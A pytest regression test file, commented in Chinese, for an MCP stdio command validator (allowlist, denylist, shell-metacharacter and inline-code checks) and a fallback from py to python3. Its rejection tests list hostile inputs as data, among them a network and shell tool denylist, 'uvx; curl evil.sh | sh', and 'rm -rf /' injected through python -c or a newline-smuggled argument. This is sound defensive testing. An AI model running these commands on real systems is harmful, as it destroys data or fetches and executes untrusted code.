# -*- coding: utf-8 -*-
"""MCP stdio 子进程安全校验回归测试

背景（本次新增）：
DriFox 的 MCP stdio 连接此前对 command 不做任何校验，直接 spawn 子进程。
若配置里的 command 被篡改为 shell / 危险命令（如 cmd、powershell、curl | sh），
会在本机拉起不可信进程。现移植 AstrBot 的 validate_mcp_stdio_config 设计，
在 spawn 前按「白名单 + 黑名单 + shell 元字符 + inline 代码标志」四层拦截。

本测试锁定 _validate_stdio_config 返回空串=通过、非空串=拒绝原因。
"""

import shutil

import pytest


from app.tools.mcp_tools import (
    _normalize_stdio_command_name,
    _resolve_stdio_command,
    _validate_stdio_config,
)


# ═══════════════════════════════════════════════════════════
# _normalize_stdio_command_name 归一化
# ═══════════════════════════════════════════════════════════


class TestNormalizeCommandName:
    def test_plain_name(self):
        assert _normalize_stdio_command_name("python") == "python"

    def test_windows_absolute_path(self):
        assert _normalize_stdio_command_name("C:\\Python312\\python.exe") == "python"

    def test_unix_path(self):
        assert _normalize_stdio_command_name("/usr/local/bin/node") == "node"

    def test_cmd_bat_extension(self):
        assert _normalize_stdio_command_name("npx.cmd") == "npx"
        assert _normalize_stdio_command_name("uvx.bat") == "uvx"

    def test_upper_case(self):
        assert _normalize_stdio_command_name("Python.exe") == "python"

    def test_relative_path(self):
        assert _normalize_stdio_command_name(".\\venv\\Scripts\\python") == "python"


# ═══════════════════════════════════════════════════════════
# 放行场景
# ═══════════════════════════════════════════════════════════


class TestAllowedConfigs:
    def test_uvx_minimax(self):
        """真实的 MiniMax MCP 配置（uvx 启动）"""
        cfg = {
            "command": "uvx",
            "args": ["--with", "mcp<2", "minimax-coding-plan-mcp", "-y"],
            "type": "stdio",
        }
        assert _validate_stdio_config(cfg) == ""

    def test_npx_server(self):
        cfg = {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem"]}
        assert _validate_stdio_config(cfg) == ""

    def test_python_module_launch(self):
        """python -m 模块启动合法（只禁 -c）"""
        cfg = {"command": "python", "args": ["-m", "mcp_server"]}
        assert _validate_stdio_config(cfg) == ""

    def test_py_absolute_path(self):
        cfg = {"command": "C:\\Python312\\python.exe", "args": ["server.py"]}
        assert _validate_stdio_config(cfg) == ""

    def test_empty_command_passthrough(self):
        """无 command 字段 → url 型（sse/http），放行"""
        assert _validate_stdio_config({"url": "https://example.com/mcp"}) == ""
        assert _validate_stdio_config({"type": "sse", "url": "http://x/sse"}) == ""


# ═══════════════════════════════════════════════════════════
# 拒绝场景
# ═══════════════════════════════════════════════════════════


class TestRejectedConfigs:
    @pytest.mark.parametrize(
        "command",
        [
            "bash",
            "sh",
            "powershell",
            "powershell.exe",
            "cmd",
            "curl",
            "wget",
            "ssh",
            "rm",
            "sudo",
            "kill",
            "docker",
            "C:\\Windows\\System32\\cmd.exe",
        ],
    )
    def test_denied_command_rejected(self, command):
        assert _validate_stdio_config({"command": command}) != ""

    @pytest.mark.parametrize(
        "command",
        ["not-a-real-lang", "ruby", "go", "java", "tar", "echo"],
    )
    def test_not_in_allowlist_rejected(self, command):
        assert _validate_stdio_config({"command": command}) != ""

    @pytest.mark.parametrize(
        "command",
        [
            "uvx; curl evil.sh | sh",
            "python && whoami",
            "npx > /tmp/pwn",
            "python `id`",
            "uvx $ENV",
        ],
    )
    def test_shell_meta_rejected(self, command):
        assert _validate_stdio_config({"command": command}) != ""

    def test_python_inline_code_rejected(self):
        cfg = {"command": "python", "args": ["-c", "import os; os.system('rm -rf /')"]}
        assert _validate_stdio_config(cfg) != ""

    def test_python_inline_code_short_flag_rejected(self):
        cfg = {"command": "py", "args": ["-3", "-c", "print(1)"]}
        assert _validate_stdio_config(cfg) != ""

    @pytest.mark.parametrize("flag", ["-e", "--eval", "-p", "--print"])
    def test_node_inline_eval_rejected(self, flag):
        cfg = {"command": "node", "args": [flag, "console.log('x')"]}
        assert _validate_stdio_config(cfg) != ""

    def test_args_with_control_chars_rejected(self):
        cfg = {"command": "python", "args": ["server.py\nrm -rf /"]}
        assert _validate_stdio_config(cfg) != ""

    def test_args_not_list_rejected(self):
        cfg = {"command": "python", "args": "-c print(1)"}
        assert _validate_stdio_config(cfg) != ""

    def test_command_not_str_rejected(self):
        cfg = {"command": 42}
        assert _validate_stdio_config(cfg) != ""

# ═══════════════════════════════════════════════════════════
# _resolve_stdio_command 跨平台回落
# ═══════════════════════════════════════════════════════════
class TestResolveStdioCommand:
    """`py` 是 Windows Python launcher 专属命令。

    macOS / Linux 上 shutil.which("py") 返回 None，子进程直接
    [Errno 2] No such file or directory: 'py'（bili-scroll 实测）。
    回落逻辑只在原命令不可用时介入。
    """

    def test_non_python_command_untouched(self, monkeypatch):
        """非 python 家族命令不替用户做主"""
        assert _resolve_stdio_command("npx", ["-y", "pkg"]) == ("npx", ["-y", "pkg"])
        assert _resolve_stdio_command("uvx", ["srv"]) == ("uvx", ["srv"])

    def test_empty_command_untouched(self):
        assert _resolve_stdio_command("", []) == ("", [])

    def test_py_falls_back_and_drops_launcher_version_arg(self, monkeypatch):
        """py 不存在 → 回落 python3，并剔除 -3"""
        monkeypatch.setattr(shutil, "which", lambda c: "/usr/bin/python3" if c == "python3" else None)
        monkeypatch.setattr("app.tools.mcp_tools._is_usable_python", lambda c: True)
        cmd, args = _resolve_stdio_command("py", ["-3", "server.py"])
        assert cmd == "python3"
        assert args == ["server.py"]

    def test_py_falls_back_with_versioned_launcher_arg(self, monkeypatch):
        monkeypatch.setattr(shutil, "which", lambda c: "/usr/bin/python3" if c == "python3" else None)
        monkeypatch.setattr("app.tools.mcp_tools._is_usable_python", lambda c: True)
        assert _resolve_stdio_command("py", ["-3.11", "s.py"]) == ("python3", ["s.py"])

    def test_py_keeps_non_version_first_arg(self, monkeypatch):
        """首个参数不是 -3/-3.x 时不能误删"""
        monkeypatch.setattr(shutil, "which", lambda c: "/usr/bin/python3" if c == "python3" else None)
        monkeypatch.setattr("app.tools.mcp_tools._is_usable_python", lambda c: True)
        assert _resolve_stdio_command("py", ["server.py"]) == ("python3", ["server.py"])

    def test_usable_command_kept_as_is(self, monkeypatch):
        """命令存在且能跑 → 原样不动"""
        monkeypatch.setattr(shutil, "which", lambda c: f"/usr/bin/{c}")
        monkeypatch.setattr("app.tools.mcp_tools._is_usable_python", lambda c: True)
        assert _resolve_stdio_command("python3", ["a.py"]) == ("python3", ["a.py"])

    def test_store_stub_skipped(self, monkeypatch):
        """Windows Store 占位 stub：which 能找到但跑不起来 → 继续回落"""
        monkeypatch.setattr(shutil, "which", lambda c: f"/usr/bin/{c}")
        monkeypatch.setattr(
            "app.tools.mcp_tools._is_usable_python",
            lambda c: c == "python",
        )
        assert _resolve_stdio_command("python3", ["a.py"]) == ("python", ["a.py"])

    def test_no_fallback_available_returns_original(self, monkeypatch):
        """别名全都不可用 → 原样返回，让上层报出真实错误"""
        monkeypatch.setattr(shutil, "which", lambda c: None)
        assert _resolve_stdio_command("py", ["-3", "s.py"]) == ("py", ["-3", "s.py"])

    def test_windows_py_launcher_untouched(self, monkeypatch):
        """Windows 上 py 存在且可用 → 命令和 -3 都原样保留（Windows 零变化）"""
        monkeypatch.setattr(shutil, "which", lambda c: f"/usr/bin/{c}")
        monkeypatch.setattr("app.tools.mcp_tools._is_usable_python", lambda c: True)
        assert _resolve_stdio_command("py", ["-3", "s.py"]) == ("py", ["-3", "s.py"])

    def test_store_stub_detected_without_executing(self, monkeypatch):
        """Store 占位 stub 按路径判否，绝不试跑（试跑会弹应用商店）"""
        from app.tools.mcp_tools import _is_store_stub

        # macOS 上构造 WindowsPath 会抛 UnsupportedOperation，用轻量替身绕开
        stub = type("P", (), {"__str__": lambda s: "C:/Users/x/AppData/Local/Microsoft/WindowsApps/python3.exe"})()
        monkeypatch.setattr("app.tools.mcp_tools.os.name", "nt")
        monkeypatch.setattr("app.tools.mcp_tools.Path.resolve", lambda self: stub)
        assert _is_store_stub("python3") is True

    def test_non_stub_path_not_flagged(self, monkeypatch):
        """普通安装路径不应被误判为 stub"""
        from app.tools.mcp_tools import _is_store_stub

        real = type("P", (), {"__str__": lambda s: "C:/Python314/python.exe"})()
        monkeypatch.setattr("app.tools.mcp_tools.os.name", "nt")
        monkeypatch.setattr("app.tools.mcp_tools.Path.resolve", lambda self: real)
        assert _is_store_stub("python") is False

    def test_store_stub_not_probed_on_macos(self, monkeypatch):
        """非 Windows 平台不做 stub 判定，避免误伤"""
        from app.tools.mcp_tools import _is_store_stub

        monkeypatch.setattr("app.tools.mcp_tools.os.name", "posix")
        assert _is_store_stub("/usr/bin/python3") is False
